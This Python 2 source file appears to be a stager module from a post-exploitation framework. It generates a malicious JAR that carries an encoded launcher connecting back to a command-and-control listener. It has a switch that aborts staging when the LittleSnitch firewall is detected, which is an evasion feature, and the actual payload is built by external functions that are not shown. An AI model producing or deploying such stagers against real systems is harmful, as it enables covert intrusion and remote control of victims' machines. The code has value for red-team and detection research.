from lib.common import helpers

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Jar',

            'Author': ['@xorrior'],

            'Description': ('Generates a JAR file.'),

            'Comments': [
                ''
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'LittleSnitch' : {
                'Description'   :   'Switch. Checks for LittleSnitch, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'OutFile' : {
                'Description'   :   'File to output duckyscript to.',
                'Required'      :   True,
                'Value'         :   '/tmp/out.jar'
            },       
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # extract all of our options
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        LittleSnitch = self.options['LittleSnitch']['Value']
        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, littlesnitch=LittleSnitch)
        
        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:
            launcher = launcher.replace('"','\\"')
            jarBytes = self.mainMenu.stagers.generate_jar(launcherCode=launcher)
            return jarBytes
